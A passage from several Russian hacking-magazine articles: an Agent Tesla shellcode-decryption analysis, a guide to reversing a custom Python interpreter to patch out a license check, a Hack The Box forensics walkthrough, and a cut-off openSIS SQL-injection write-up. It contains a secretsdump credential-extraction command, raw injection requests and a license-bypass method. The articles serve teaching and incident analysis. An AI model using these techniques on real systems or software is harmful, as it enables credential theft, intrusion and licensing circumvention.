  int iVar4;
  code **ppcVar5;
  _func_void_void_ptr_ulong_void_ptr **pp_Var6;
  byte *OpenFileArg;
  uint uVar7;
  BOOL unaff_ESI;
  undefined4 uVar8;
  undefined4 uVar9;
  void *local_14;


  // Интересная функция 1
  uVar3 = ___scrt_initialize_crt(1);
  if (uVar3 != '\0') {
    bVar2 = false;
    // Интересная функция 2
    uVar3 = ___scrt_acquire_startup_lock();
    if (DAT_0041cb9c != 1) {
      if (DAT_0041cb9c == 0) {
        DAT_0041cb9c = 1;
        iVar4 = __initterm_e(&DAT_00414238,&DAT_00414254);
        if (iVar4 != 0) {
          ExceptionList = local_14;
          return 0xff;
        }
        FUN_00407131(&DAT_0041422c,&DAT_00414234);
        DAT_0041cb9c = 2;
      }
      else {
        bVar2 = true;
      }
      // Интересная функция 3
      ___scrt_release_startup_lock(uVar3);
      ppcVar5 = FUN_00401e6e();
      if ((*ppcVar5 != 0x0) &&
         (uVar3 = ___scrt_is_nonwritable_in_current_image(ppcVar5),
         // Интересная функция 4
         uVar3 != '\0')) {
        pcVar1 = *ppcVar5;
        uVar9 = 0;
        uVar8 = 2;
        uVar3 = 0;
        // Интересная функция 5
        _guard_check_icall();
        (*pcVar1)(uVar3,uVar8,uVar9);
      }
      pp_Var6 = FUN_00401e74();
      if ((*pp_Var6 != 0x0) &&
         (uVar3 = ___scrt_is_nonwritable_in_current_image(pp_Var6),
         // Интересная функция 6
         uVar3 != '\0')) {
        // Интересная функция 7
        __register_thread_local_exe_atexit_callback(*pp_Var6);
      }
      // Интересная функция 8
      ___scrt_get_show_window_mode();
      // Интересная функция 9
      OpenFileArg = __get_narrow_winmain_command_line();
      unaff_ESI = main(0x400000,0,OpenFileArg); // !
      uVar7 = FUN_00401fcb();
      if (uVar7 != '\0') {
        if (!bVar2) {
          __cexit();
        }
        // Интересная функция 10
        ___scrt_uninitialize_crt('\x01','\0');
        ExceptionList = local_14;
        return unaff_ESI;
      }
      goto LAB_00401afd;
    }
  }
  FUN_00401e7a(7);
LAB_00401afd:


  _exit(unaff_ESI);

В этом коде наша функция FUN_00401300 уже названа мной main, но как я
узнал об этом? Смотрим внимательно и видим, что вызывающая main фун‐
кция имеет название __cdecl __scrt_common_main_seh(void). То есть эта
функция — начало рантайма CRT. Она делает необходимые настройки (в том
числе SEH, как видно из названия) и затем уже загружает функцию main,
которая имеет прототип main(int argc, const char **argv, const char
**envp), то есть ожидает три аргумента. Далее вспоминаем, что наше при‐
ложение — 32-битное, поэтому вызывающий код будет выглядеть примерно
так:


push edi
push esi
push [ eax]
call main

В декомпилированном листинге видим вот что (аргумент OpenFileArg уже
назван мной):


___scrt_get_show_window_mode();
OpenFileArg = __get_narrow_winmain_command_line();
unaff_ESI = main(0x400000,0,OpenFileArg);

Аргументы             извлекаются          вызовом            функции
__get_narrow_winmain_command_line(),  кроме  того,  вызывается метод
___scrt_get_show_window_mode(), который сигнализирует, показывать окно
приложения или нет. Также видим функции инициализации и деинициали‐
зации CRT: ___scrt_initialize_crt и ___scrt_uninitialize_crt. Одним
словом, мы однозначно определяем, что это обвязка CRT для функции main,
и при помощи шагов, описанных выше, определяем точку входа в main.


             INFO

                         Перед нами хороший пример того, сколько кода
                         компилятор автоматически укладывает в создава‐
                     емое  приложение. Мы пишем  простой  «Hello,
                           world»,    состоящий   из   одной    функции
                   MessageBox, а в таблице импорта видим много
                            интересного. Чтобы избежать подобного, нужно
                          поколдовать над настройками проекта.



Расшифровываем шелл-код
Итак, мы можем сделать вывод, что параметр param_3, ради которого мы
провели это небольшое исследование, — это не что иное, как путь, переда‐
ваемый как аргумент командной строки. Вспоминаем, что в скрипте инстал‐
лятора мы видели строчку, начинающуюся с ExecWait. Она говорит нам
о том, что в качестве  аргумента передается файл pgkayd.aq, который
находится в числе файлов инсталлятора. Идем по функции main дальше
и видим:


// Выделяем память
_Dst = VirtualAlloc(0x0,0x1de0,0x1000,0x40);
// Если вызов VirtualAlloc неудачный, производим очистку и идем на
завершение
if (_Dst == 0x0) {
  UnmapViewOfFile(_Src);
  CloseHandle(hFileMappingObject);
  CloseHandle(hFile);
  BVar3 = 0;
}
else {
  // Копируем данные в выделенную область при помощи memcpy
  FID_conflict:_memcpy(_Dst,_Src,0x1de0);
  // А это цикл расшифровки данных, основанный на XOR
  for (local_8 = 0; local_8 < 0x16c2; local_8 = local_8 + 1) {
    _Dst[local_8] = _Dst[local_8] ^ s_248058040134_0041c2a4[local_8 %
0xc];
  }
  // Вызов расшифрованного кода
  (*_Dst)();

Здесь много интересного: и вызов VirtualAlloc, за который мы уцепились,
чтобы попасть сюда, и цикл, который ксорит данные по ключу, расшифро‐
вывая их, и вызов (*_Dst)();, который выполняет расшифрованный код. Я
снабдил листинг подробными комментариями, чтобы была понятна логика.


             INFO

                            Разумеется, тех же результатов мы смогли бы
                            достичь,  используя  отладчик,  но  я  захотел
                         показать, как это можно  сделать, не вылезая
                       из дизассемблера и используя только статичес‐
                       кий анализ.


Так, функции дешифровки и ее логика локализованы, теперь потребуется
динамика! Расчехляем отладчик x86dbg, чтобы извлечь наш расшифрованный
шелл‑код в отдельный файл.


Вытаскиваем шелл-код отдельным файлом
Чтобы вытащить расшифрованный шелл‑код, нам нужно запустить файл
в отладчике. Из файла скрипта NSIS помним, что для корректного запуска
в наш exe’шник нужно передать в качестве аргумента файл pgkayd.aq. Все
это можно настроить прямо в интерфейсе x86dbg.





                  Настраиваем запуск вредоноса в x86dbg

Теперь устанавливаем точку останова на VirtualAlloc и запускаемся. Таким
образом мы  проскочим  антиотладку  и  проверку  аргумента,  который
помешал бы нам нормально запуститься (потому что аргумент мы заполнили
на предыдущем шаге), и остановимся на VirtualAlloc. Далее ее необходимо
выполнить до ret, завершив работу функции. Наблюдаем следующую картину:
в EAX у нас хранится адрес выделенной VirtualAlloc памяти, которую мы прос‐
матриваем в окне дампа. Мы знаем, что расшифровка пойдет в этот буфер,
поэтому ставим точку останова по доступу на начало буфера, ожидая там
появления данных. После этого зашифрованный код скопируется в буфер,
и мы увидим это в окне дампа.





            Состояние Agent Tesla перед дешифровкой в x86dbg

С учетом знаний, полученных на этапе статического анализа, мы знаем, что
следом после копирования зашифрованных данных в буфер идет его рас‐
шифровка. Ставим бряк сразу после цикла расшифровки и видим, как данные
в буфере  изменились.  Теперь,  дизассемблировав  их  вручную  (Follow
in Disassembler в x86dbg), можно убедиться, что это осмысленный код.





           Цикл расшифровки и вызов шелл‑кода в Agent Tesla

Как видно на скрине, мы пришли к тому, что шелл‑код полностью расшифро‐
ван и готов выполняться. Теперь нам нужно его сохранить в отдельный файл,
чтобы  продолжить  исследования  позднее.  Вызываем  команду  Follow
in Memory Map из контекстного меню дампа и перемещаемся к карте памяти.





                            Карта памяти Agent Tesla

Далее жмем Dump Memory to File в контекстном меню и тем самым сохраня‐
ем выделенную память. Обрати внимание на права этой области памяти —
ERW (то же, что RWX), говорящие о том, что память готова выполниться (крас‐
ный флаг для антивируса!). Полученный дамп можно будет загрузить как файл
в Ghidra для дальнейших исследований. Единственная загвоздка в том, что
нужно вручную выбрать параметры анализа в дизассемблере.





                  Загрузка полученного шелл‑кода в Ghidra

Так как изначальный файл был 32-битный и собран в Visual Studio, такие же
параметры выбираем для шелл‑кода.


ВЫВОДЫ

Итак, в этой статье мы достаточно многому научились: разобрались с NSIS-
скриптом, справились с распаковкой, расшифровали шелл‑код и сохранили
нашу работу. И проделали это все в Ghidra (и в x86dbg), избавив себя
от необходимости использовать платную IDA Pro.
ВЗЛОМ





Реверс‑инженеру далеко не всегда удается
без    труда   исследовать   написанные
на Python приложения. Разработчики умеют
хранить свои  тайны, используя обфуска‐
цию, шифрование, кастомный маршалинг           МВК
и  собственные  интерпретаторы. Но для
любого замка отыщется отмычка: сегодня
мы разберемся, как реверсить такие прог‐
раммы,     научимся      восстанавливать
исходный код и узнаем, как создать для них
собственный дизассемблер.


Мы уже писали о распространенных способах защиты исходного кода Python
от реверс‑инжиниринга и принципах их обхода. В сегодняшней статье я про‐
должу эту тему и расскажу об особенностях реверса кастомной нестандар‐
тной реализации Python-интерпретатора.


           WARNING

                        Статья написана в исследовательских целях, име‐
                         ет ознакомительный характер и предназначена
                       для   специалистов  по  безопасности.  Автор
                      и редакция не несут ответственности за любой
                        вред, причиненный с применением изложенной
                        информации.  Использование  или  распростра‐
                      нение ПО без лицензии  производителя может
                           преследоваться по закону.


В качестве примера возьмем некое приложение для нейросетевой обработ‐
ки видео с нехорошей особенностью: приложение проверяет лицензию
на удаленном сервере при выполнении всех более‑менее полезных функций.
Если проверка завершается успешно, оно продолжает работать офлайн, что
дает нам надежду на возможность запускать программу без подключения
к интернету.
   То, что это классическое Python-приложение, видно с первого взгляда,
даже без запуска Detect It Easy.





Поскольку рядом с исполняемым модулем лежат питоновские библиотеки,
а подкаталоги заполнены файлами с расширением .pyc, никаких сомнений
в использовании Python не остается. Что это за файлы и с чем их едят, я под‐
робно рассказывал в статье «Змеиная анатомия. Вскрываем и потрошим
PyInstaller». В двух словах поясню для тех, кто не читал эту публикацию: упо‐
мянутые бинарные файлы содержат прекомпилированный байт‑код, подава‐
емый непосредственно на вход интерпретатора для ускорения обработки.
В этой же статье приведены и известные декомпиляторы и дизассемблеры
файлов подобного формата (uncompyle6, pycdc, pydasm...).
  На этой оптимистичной ноте можно было бы и закончить статью, но нет.
Несмотря на валидный заголовок .pyc-файла с сигнатурой версии 3.10
(выделено красным), ни один из стандартных декомпиляторов или дизассем‐
блеров не ест такие файлы, выдавая ошибку типа CreateObject:  Got
unsupported type 0x5D. При просмотре файла в HEX-редакторе мы видим,
что он весь, собственно, и состоит из явно зашифрованного объекта нес‐
тандартного типа (выделено желтым, 0xDD & 0x7F = 0x5D).





Налицо явно кастомная нестандартная питоновская реализация, благо, как я
уже говорил, исходный код Python в сети присутствует, и нет ничего сложного
подогнать его под свои нужды. По счастью, шифрование здесь используется
явно не шибко взрослое. На скриншоте прослеживается повторяющийся
через каждые 16 байт шаблон, который, похоже, наложен операцией XOR
на исходный код и местами проглядывает на месте нулевых последователь‐
ностей.
   Поискав в нативных библиотеках явный фрагмент такого шаблона (нап‐
ример, 25 02 39 04), мы тут же натыкаемся в файле python311.dll на шаб‐
лон (выделено красным) и код, расшифровывающий данные сразу после чте‐
ния из файла.





Чуть поигравшись с отладчиком x64dbg, мы обнаруживаем и место вызова
этого     кода:    Py_Main     ->     PyRun_SimpleFileObject     ->
PyMarshal_ReadLastObjectFromFile, начиная с которого в отладчике мож‐
но следить за расшифровкой и интерпретацией байт‑кода.
   Попробуем для начала добиться какой‑то более‑менее понятной деком‐
пиляции .pyc-файлов. Для этого напишем простенький расшифровщик, рас‐
ксоривающий объект 0x5D полученной маской. Благодаря этому исходный
файл удается привести в гораздо более читаемый вид.





К сожалению, этот код, хоть и сильно похож на настоящий, все равно
не работает. На этот раз вылезает ошибка CreateObject: Got unsupported
type  0x0. У меня возникло сильное подозрение на нестандартный мар‐
шалинг объектов внутри .pyc-файла.
  По счастью, среди множества файлов пакета присутствуют и стандартные
библиотеки (например, base64.pyc), которые имеются в нормально откомпи‐
лированном виде аналогичной версии.





         Слева — обычный base64.pyc, справа — расшифрованный

Сразу видно, что побайтовое сравнение этих файлов — плохая идея, разница
в коде на первый взгляд просто чудовищная. Начать с того, что даже по раз‐
меру стандартным образом откомпилированный base64.pyc почти в два раза
меньше расшифрованного. Тем не менее с ходу заметно, что изначальная
гипотеза о нестандартном маршалинге оказалась верной: в расшифрован‐
ном  файле  как минимум  отсутствует  32-битное поле kwOnlyArgCount
(выделено красным).
   Слегка поборов первичный ужас,  приступаем  к решению проблемы.
Берем за основу упомянутый в моей статье пакет pycdc и, дизассемблируя
им исходный и расшифрованный base64.pyc, пытаемся найти разницу.
  За загрузку объекта code здесь отвечает метод void PycCode::load(
PycData* stream, PycModule* mod) модуля pyc_code.cpp. Сразу убираем
следующую конструкцию:


if (mod->majorVer() >= 3)
        m_kwOnlyArgCount = stream->get32();
    else
        m_kwOnlyArgCount = 0;

Это дает нам значительный прогресс в исследовании объекта. Не буду при‐
водить всю рутину тестов, проб и ошибок, в ходе которых выясняется, что все
не так уж и страшно. Кроме описанного выше поля, кастомный формат отли‐
чается,  по  сути,  только  положением  последовательностей  freeVars
и cellVars. Поправив их, мы получаем версию pycdas.exe, дизассембли‐
рующую байт‑код без ошибок. Но тут нас снова ждет облом, поскольку вос‐
становленный код выглядит примерно так:


...
[Names]
    'os'
    'system'
    'name'
    'print'
    'advanced_entry_message'
    'simple_entry_message'
[Var Names]
    'mode'
[Free Vars]
[Cell Vars]
[Constants]
    None
    'nt'
    'cls'
    'clear'
[Disassembly]
    0       <INVALID>
    2       LOAD_GLOBAL    1: system
    4       <INVALID>
    6       <INVALID>
    8       <INVALID>
    10      <INVALID>
    12      <INVALID>
    14      LOAD_ATTR      1: system
    16      <INVALID>
    18      <INVALID>
    20      <INVALID>
    22      <INVALID>
    24      LOAD_GLOBAL    0: os
    26      <INVALID>
    28      <INVALID>
    30      <INVALID>
    32      <INVALID>
    34      <INVALID>
    36      LOAD_ATTR      2: name
...

То есть классы, строки, методы и прочие элементы восстанавливаются вро‐
де бы правильно, однако сам байт‑код не раскодируется, хотя даже аргумен‐
ты команд выглядят похожими на правильные.
   Видимо, и тут нам программисты подложили свинью — помимо кастомно‐
го маршалинга, нам подсунули еще и кастомную систему команд, отли‐
чающуюся от стандартной 3.10 и даже 3.11.
  Но и это прискорбное открытие нас не останавливает, ведь в предыдущей
статье мы уже научились искать интерпретатор байт‑кода. Вот и здесь мы
быстро находим его, например внутри функции _PyEval_EvalFrameDefault.





Правда, это нам не сильно помогает. К сожалению, мнемоники новых команд
в интерпретатор не встроены, поэтому для воссоздания полнофункциональ‐
ного дизассемблера нам предстоит проверить 181 обработчик команд, све‐
рив  их  с  прежними  таблицами  опкодов  из  файлов python_3_10.cpp
и python_3_11.cpp. Затем придется создать новую таблицу, причем даже
количество команд  тут не  совпадает. Задача довольно  муторная, хотя
и исполнимая. Имеет смысл довести ее до конца в случае, если нам требует‐
ся полностью восстановить исходники программы. Если же нужно просто
найти и поправить определенное место в коде, все гораздо проще: достаточ‐
но нащупать команды NOP и условные‑безусловные переходы. Тем более что
NOP у нас на предыдущем скриншоте идет первой командой (опкод 0x53).
Для патча теперь надо только отыскать нужное место (через исправленный
дизассемблер), отредактировать его и заново перексорить по шаблону.
   Задача написать полный дизассемблер или декомпилятор, конечно, силь‐
но избыточна для разового патча конкретного специфического приложения,
но сегодняшний пример может послужить основой для допиливания сущес‐
твующего декомпилятора по мере выхода новых версий Python. А выходят они
регулярно.
ВЗЛОМ





Сегодня мы будем учиться анализировать
логи Windows и смотреть полную информа‐
цию о файле в таблице MFT. Это поможет
нам восстановить последовательность дей‐
ствий злоумышленника в системе и рас‐            rayhunt454                                                                                       grigadan454@gmail.com
крыть его никнейм.


Площадкой для упражнений нам послужит задание Jinkies c ресурса Hack
The Box Sherlocks.
  По  сценарию  задания  компьютерная  атака  произошла  6  октября
в инфраструктуре стартапа Cloud-Guru-Management Ltd, где разрабатывают
некий продукт. Известно, что пользователь взломанного компьютера случай‐
но предоставил общий доступ к своей папке Documents, а также утверждает,
что в этот день его не было за компьютером. Генеральный директор Cloud-
Guru-Management 6 октября получил устные сообщения о том, что интеллек‐
туальная собственность компании была украдена. Команда реагирования
на  инциденты  собрала  артефакты  операционной  системы  взломанного
компьютера с помощью утилиты KAPE. Наша задача — провести расследова‐
ние инцидента и восстановить картину взлома ресурса.


ИСПОЛЬЗУЕМЫЕ УТИЛИТЫ

 • Hayabusa —  инструмент для  быстрого  анализа  логов,  основанный
   на правилах Sigma.
 • FullEventLogView — утилита Nirsoft для анализа событий. Она позволяет
   фильтровать логи по датам, идентификаторам событий, а также по клю‐
  чевым словам. Чтобы использовать этот инструмент, достаточно указать
   каталог с файлами evtx.
 • MFTECmd — парсер таблицы MFT файловой системы NTFS.
 • DB Browser for SQLite — инструмент для просмотра базы данных
   SQLite, необходим при анализе истории браузера Chrome.
 • Registry Explorer — утилита для просмотра кустов реестра Windows.


ИССЛЕДОВАНИЕ

Загрузим файл архива задания и приступим к исследованию артефактов.
  В файле архива содержатся следующие данные: каталог TriageData,
в котором расположены собранные файловые артефакты операционной сис‐
темы; каталог LiveResponse, содержащий список запущенных процессов;
информация о системе и много других волатильных данных.
   Чтобы  получить инфу об  исследуемом  компьютере,  откроем файл
LiveResponse\Systeminfo.csv.  Имя   исследуемого   компьютера —
VELMAD100, установлена операционная система Windows 10 Pro. Из файла
ipconfig.txt  получим  сетевые  настройки  интерфейса,  IP-адрес  хос‐
та   192.168.157.144,   IP-адрес   шлюза   192.168.157.2,   DHCP-сер‐
вер 192.168.157.254.
  Нам     известно,     что     компьютерный     инцидент     произо‐
шел 6 октября 2023 года. Проанализируем все события операционной сис‐
темы за этот день. Откроем утилиту FullEventLogView и загрузим логи, рас‐
положенные по такому пути:


Jinkies_KAPE_output/TriageData/C/Windows/system32/winevt/

Затем выставим фильтр по дате (Options → Advanced Options) и приступим
к анализу.
   Первым делом  проанализируем сообщения о событиях  авторизации
в системе и запуска процессов. На исследуемом хосте установлена служба
Sysmon (системный монитор) — эта утилита разработана в Microsoft для рас‐
ширенного аудита Windows. Sysmon предоставляет подробную информацию
об активности системы на уровне процессов и сети. Подробная информация
о каждом идентификаторе событий есть в документации Microsoft.
  В FullEventLogView откроем вкладку Options → Advanced Options → Show
only specified event IDs и введем следующие идентификаторы событий:
 • 4624 — событие входа в систему, нам интересен тип входа и источник
   авторизации;
 • 4648 — вход в систему с явным указанием аутентификационных данных;
 • 4672 — сеансу входа назначены специальные привилегии;
 • 4625 — ошибка входа в систему;
 • 1149 — событие описывает признак входа в систему по протоколу RDP;
   такое событие регистрируется при подключении источника к хосту;
 • 21 — успешный вход пользователя в сеанс RDP;
 • 24 — отключение сеанса RDP;
 • 1 (журнал событий Sysmon) — событие создания процесса, содержит под‐
  робную информацию о созданном процессе: хеш, команда запуска и так
   далее;
 • 3 (журнал Sysmon) — событие сетевого подключения регистрирует TCP-
   и UDP-соединения.

В 17:15 зафиксировано событие с идентификатором 4624, тип входа 3
(сетевой вход) с хоста 192.168.157.151, с использованием учетных данных
пользователя Velma.





Далее в 17:16:09 зафиксирован отказ доступа к общему ресурсу C:\Users\
Velma\Documents, источник — адрес 192.168.157.151.





Мы зафиксировали сетевой вход с IP-адреса 192.168.157.151, а также доступ
к общим  каталогам  на  исследуемом  компьютере. В  ключе  реестра
ControlSet001\Services\LanmanServer\Shares куста SYSTEM расположены
имена общих каталогов и пути к ним. Давай заглянем в этот ключ с помощью
утилиты Registry Explorer.




                Содержимое ключа реестра LanmanServer

На исследуемом компьютере есть общие директории C:\Users\Velma\
Documents и C:\Users.
   Также по пути, приведенному ниже, расположены дескрипторы безопас‐
ности, то есть разрешения для доступа к общим каталогам.


ControlSet001\Services\LanmanServer\Shares\Security

Выгрузим бинарный вид дескрипторов и преобразуем в формат SDDL (стро‐
ка с описанием прав доступа).




                  Бинарный вид дескриптора безопасности

Напишем для этого небольшой скрипт на PowerShell.


$Documents = [byte]0x01,0x0,0x04,0x80,0x30,0x0,0x0,0x0,0x40,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x14,0x0,0x0,0x0,0x02,0x0,0x1C,0x0,0x01,0x0,0x0,
0x0,0x0,0x0,0x14,0x0,0xA9,0x0,0x12,0x0,0x01,0x01,0x0,0x0,0x0,0x0,0x0,
0x01,0x0,0x0,0x0,0x0,0x01,0x02,0x0,0x0,0x0,0x0,0x0,0x05,0x20,0x0,0x0,
0x0,0x20,0x02,0x0,0x0,0x01,0x05,0x0,0x0,0x0,0x0,0x0,0x05,0x15,0x0,
0x0,0x0,0xC8,0x99,0x9C,0xCE,0x9E,0xC8,0x69,0x4E,0x77,0x79,0xD4,0x8F,
0x01,0x02,0x0,0x0


$converter = new-object system.management.ManagementClass Win32_
SecurityDescriptorHelper


$outsddl = $converter.BinarySDToSDDL($Documents)

Получаем следующий вид SDDL для каталога Documents:


O:BAG:S-1-5-21-3466369480-1315555486-2413066615-513D:(A;;0x1200a9;;;
WD)

Подробное описание этой структуры есть в статье «Как смотреть SDDL и не
ломать глаза о точки с запятыми».
  Для преобразования в читаемый вид воспользуемся конвертером SDDL.





                           Преобразование SDDL

Как видно из работы конвертера, все пользователи могут получить доступ
к общему сетевому ресурсу C:\Users\Velma\Documents.
   Теперь посмотрим содержимое общего каталога TriageData\C\Users\
Velma\Documents. Мое внимание привлек файл bk_db.idb, расположенный
по следующему адресу:


web server Python Scripts + things\web server project\testing\logon
website\bk

Здесь  содержатся  учетные  записи  пользователей. Давай вытащим  их
при помощи утилиты strings.


strings bk_db.idb > users.txt





                      Содержимое файла bk_db.idb

В файле bk_db.idb отыскалось 216 пользователей.
   Сравним пароль найденного пользователя Velma и NT-хеш из реестра.
Для  этого считаем  кусты реестра SAM, SYSTEM и SECURITY с помощью
secretsdump.


secretsdump.py -system Jinkies_KAPE_output/TriageData/C/Windows/
system32/config/SYSTEM -sam Jinkies_KAPE_output/TriageData/C/Windows/
system32/config/SAM -security Jinkies_KAPE_output/TriageData/C/
Windows/system32/config/SECURITY LOCAL





                    NT-хеш пользователя Velma

Вот NT-хеш пользователя Velma:


967452709ae89eaeef4e2c951c3882ce

Он соответствует паролю peakTwins2023fc.
  Мы на данный момент установили, что злоумышленник получил доступ
к файлу, содержащему аутентификационные данные пользователей. Скорее
всего, он продвигался дальше, поэтому и мы продолжим анализировать
события Windows.
  В 17:17:23 6 октября 2023 года зафиксирован успешный вход пользовате‐
ля Velma по протоколу RDP с хоста 192.168.157.151.





                   Успешный вход пользователя Velma

Тип входа 10 события с идентификатором 4624 говорит о подключении
по RDP.
   Злоумышленник успешно авторизовался на хосте. Чтобы установить, что
он делал дальше, нам нужно проанализировать запуск исполняемых прог‐
рамм. В логах Sysmon нас интересуют события с идентификатором 1.
  В 17:17:45 злоумышленник выполнил команду whoami из командной обо‐
лочки cmd.exe.





                            Запуск команды whoami

В 17:17:52 злоумышленник получил информацию об общих сетевых ресурсах,
выполнив команды net group и net users.
  В 17:18:41 пользователь Velma запустил браузер, выполнив chrome.exe.





                           Запуск браузера Chrome

В 17:21:44 злоумышленник открыл файл Version-1.0.1 - TERMINAL LOGIN.
py с помощью утилиты notepad.exe.





                                Открытие файла

В  17:23:51  злоумышленник  получил  доступ  к  файлу C:\Users\Velma\
Pictures\learn.txt. Подробную информацию об этом файле посмотрим
чуть позже.





                            Открытие файла learn.txt

Восстановим историю браузера Chrome. Для этого загрузим в DB Browser for
SQLite вот этот файл:


C/Users/Velma/Appdata/Local/Google/Chrome/User Data/Default/History

Переходим на вкладку «Данные» и выбираем таблицу urls. Теперь жмем пра‐
вой кнопкой мыши на поле last_visit_time и преобразуем формат вре‐
мени в следующий:


datetime((time/1000000)-11644473600, 'unixepoch', 'localtime')





                          Преобразование формата





                            История запросов

В 17:19:56 злоумышленник перешел на ресурс Pastes.io, который использует‐
ся злоумышленниками для распространения кода и кражи документов. Поп‐
робуем найти выгруженный злоумышленником файл.
   Зайдем на  Pastes.io,  откроем  вкладку  Archive →  Python,  отсчитаем
количество месяцев от дня кражи файла и нашего исследования и попробуем
найти документ с именем leaked docs cloud guru mgmt.



                       Название украденного файла





                         Содержимое документа

Злоумышленник похитил файл Version-1.0.1 - TERMINAL LOGIN.py, и нам
удалось получить ссылку на загруженную им версию этого документа.
   Работая  в  RDP-сессии,  злоумышленник  открывал файл  learn.txt,
в котором оставил какие‑то данные о себе. Давай проанализируем таблицу
MFT, найдем дату создания и подробную информацию о файле.



                  Файл learn.txt в MFT-таблице

Файл learn.txt создан злоумышленником в 17:23:46 6 октября 2023 года
и имеет идентификатор 78533. Мы можем получить все детали записи о фай‐
ле в MFT-таблице при помощи утилиты MFTECmd. В качестве аргумента (--
de) укажем номер 78533.


.\MFTECmd.exe -f "Jinkies_KAPE_output\TriageData\C\MFT" --de 78533





            Детальная информация о файле learn.txt в таблице MFT

В поле DATA содержится ник злоумышленника pwnmaster12, а также некото‐
рые другие данные.


ВЫВОДЫ

Мы провели расследование  инцидента. Компрометация  хоста произош‐
ла 6 октября 2023 года в 17:17:23, злоумышленник зашел с хоста в локальной
сети (IP-адрес 192.168.157.1519) от имени  пользователя Velma.  Аутен‐
тификационные данные злоумышленник получил в результате небезопасной
настройки общего сетевого ресурса C/Users/Velma/Documents и сохранил
в файл bk_db.idb в открытом виде. Также мы нашли путь эксфильтрации фай‐
ла, восстановили запись в таблице MFT о созданном злоумышленником фай‐
ле и обнаружили никнейм нарушителя.
ВЗЛОМ





В этой статье мы с тобой разберем нес‐
колько видов  SQL-инъекций на боевом
примере — приложении openSIS, в коде
которого  я нашел  несколько  серьезных
проблем. Если ты хочешь научиться обна‐              az_AZ                                                                                       xdvyznq28qfn@proton.me
руживать потенциальные проблемы в коде
на PHP, этот материал должен стать живой
иллюстрацией. Особенно она будет полез‐
на новичкам, которые хотят разобраться
с темой SQLi.


             INFO

                            Если ты вдруг не в курсе, как вообще работают
                        SQL-инъекции,  специально для тебя написана
                         статья  «SQL-инъекции.  Разбираем на  пальцах
                       одну из самых популярных хакерских техник».


openSIS — это бесплатная и открытая информационная система для учебных
заведений, доступная для школ и высших учебных заведений. Она разработа‐
на и поддерживается компанией Open Solutions for Education.
  Я установил это приложение локально, что позволило мне видеть все зап‐
росы, отправляемые им в базу данных. Другими словами, тестирование про‐
водилось методом белого ящика: знание кода и структуры данных позволило
тщательно изучить, как обрабатывается то, что ввел пользователь, и как фор‐
мируются SQL-запросы.
  Я искал те места в коде, где ввод подставляется в SQL-запрос без дол‐
жной проверки и чистки (валидации и санитизации). Давай посмотрим, что
мне удалось найти.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ЛОГИРОВАНИЕ

Первым делом нам потребуется настроить логирование запросов к базе дан‐
ных. То есть нам нужно записывать выполняемые запросы к базе, чтобы
потом по ним можно было посмотреть, как программа реагировала на то, что
пользователь вводил на сайте. Это поможет нам нагляднее увидеть проб‐
лемы и воспользоваться ими.
  В MySQL или MariaDB для включения логирования нужно выполнить сле‐
дующее:
 1. Создать файл mysql.log в директории /var/log/mysql.
 2. Изменить права на файл или папку и предоставить разрешения поль‐
   зователю mysql:


   chown mysql:mysql /var/log/mysql -R

 3. Открыть файл с настройками MySQL/MariaDB, обычно расположенный в /
   etc/mysql/my.cnf или /etc/my.cnf.
 4. Найти секцию [mysqld] (если ее нет, добавить самостоятельно).
 5. Добавить или раскомментировать следующие  строки для включения
   логирования запросов:


   general_log = 1
   general_log_file = /var/log/mysql/mysql.log

 6. Перезапустить сервис MySQL/MariaDB, чтобы изменения вступили в силу.


НЕМНОГО О SQLI

Забегая вперед, скажу, что мы найдем (но не будем эксплуатировать) «сле‐
пые» SQL-инъекции. В отличие от других форм SQLi, слепые SQL-инъекции
не раскрывают данные напрямую и требуют тонкого подхода к извлечению
данных. Слепые SQL-инъекции делятся на две основные категории: на осно‐
ве булевых значений и на основе времени.
  В булевой слепой SQLi мы изменяем SQL-запрос так, чтобы система воз‐
вращала булево значение — то есть ответ на то, истинно выражение или лож‐
но. Этот тип  атаки использует бинарную природу  ответов: содержимое
веб‑страницы или  код  ответа HTTP  будет  изменяться  в  зависимости
от истинности внедренного запроса. Например, изменение запроса может
привести к тому, что какие‑то элементы на веб‑странице будут появляться
и исчезать в зависимости от того, истинны ли результаты запроса (условие
существует в базе данных) или ложны (его нет).
   Временные слепые SQL-инъекции более скрытны. Здесь мы внедряем
SQL-команды, которые заставляют базу данных задуматься чуть дольше
обычного, и используем это, чтобы вытащить из нее данные. Отсутствие визу‐
альной обратной связи на странице делает эти атаки особенно трудными
для  обнаружения. Если  условие  запроса  истинно,  ответ базы  данных
намеренно задерживается, и отсутствие задержки означает «ложь». Измеряя
время ответа, мы можем определить наличие или отсутствие конкретных дан‐
ных в базе.


НЕАУТЕНТИФИЦИРОВАННЫЕ SQLI

При поиске багов в приложении ты должен ориентироваться в первую оче‐
редь на уязвимости, которые не требуют аутентификации пользователя, так
как они самые опасные. Я нашел две похожие SQL-инъекции в разделе «Сту‐
дент» в  функциях, отвечающих за  восстановление имени  пользователя
и пароля.





Я отправил два запроса: первый, имитируя работу формы Forgot Password,
второй — Forgot Username.
   Forgot Password:


POST /openSIS/ResetUserInfo.php HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0


pass_user_type=pass_student&pass_type_form=password&password_stn_
id=XSS&uname=aaaaa&month_password_dob=04&day_password_dob=25&year_
password_dob=2024&pass_email=bbbbb&password_stf_email=ccccc&
TOKEN=697a3d1713a51879a79ee08052d4683c68d78a1c776f606e32e92127d04c33e
5

Forgot Username:


POST /openSIS/ResetUserInfo.php HTTP/1.1
Host: 192.168.147.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0


uname_user_type=uname_student&user_type_form=username&username_stn_
id=XSS&pass=aaaaaaa&month_username_dob=04&day_username_dob=30&year_
username_dob=2024&un_email=&username_stf_email=&
TOKEN=bf2278f6caffbf561127ce91c29849fdff3b9add9d88dcd7118f8cf1fca807b
5&
save=Confirm

Вот в какие SQL-запросы это трансформировалось:


Query   SELECT s.* FROM students s,login_authentication la
 WHERE la.USER_ID=s.STUDENT_ID AND la.USERNAME='aaaaa'
 AND s.BIRTHDATE='2024-04-25' AND s.STUDENT_ID=XSS AND la.PROFILE_ID=
